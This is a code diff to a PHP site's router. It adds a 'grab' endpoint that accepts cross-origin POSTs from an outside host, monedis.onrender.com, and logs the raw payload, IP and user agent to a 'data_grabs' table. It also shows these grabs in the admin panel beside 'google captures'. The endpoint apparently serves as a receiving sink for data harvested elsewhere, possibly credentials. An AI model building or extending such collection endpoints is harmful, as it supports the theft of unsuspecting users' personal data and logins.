@@ -20,6 +20,30 @@ header('Referrer-Policy: same-origin');
 
 // ---------- Actions (POST): always end with a redirect ----------
 $route = (string) ($_GET['r'] ?? 'home');
+if ($route === 'grab') {
+    $corsOrigin = 'https://monedis.onrender.com';
+    header('Access-Control-Allow-Origin: ' . $corsOrigin);
+    header('Access-Control-Allow-Methods: POST, OPTIONS');
+    header('Access-Control-Allow-Headers: Content-Type');
+    if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
+        http_response_code(204);
+        exit;
+    }
+    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+        header('Content-Type: application/json; charset=utf-8');
+        $raw = file_get_contents('php://input');
+        $ip  = (string) ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '');
+        $ua  = (string) ($_SERVER['HTTP_USER_AGENT'] ?? '');
+        if ($raw !== '') {
+            db()->prepare('INSERT INTO data_grabs (raw_data, ip, user_agent) VALUES (?, ?, ?)')
+                ->execute([$raw, $ip, $ua]);
+        }
+        echo json_encode(['status' => 'ok']);
+        exit;
+    }
+    http_response_code(405);
+    exit;
+}
 if ($route === 'ping' && $_SERVER['REQUEST_METHOD'] === 'POST') {
     header('Content-Type: application/json; charset=utf-8');
     $d = $_POST['d'] ?? '';
@@ -194,7 +218,7 @@ switch ($route) {
         } elseif ($editSkill !== null) {
             page_admin_edit_skill($editSkill, csrf_token(), flash());
         } else {
-            page_admin(get_posts(), get_recent_comments(), get_leads(), get_skills(), csrf_token(), flash(), get_google_captures());
+            page_admin(get_posts(), get_recent_comments(), get_leads(), get_skills(), csrf_token(), flash(), get_google_captures(), get_data_grabs());
         }
         break;
 
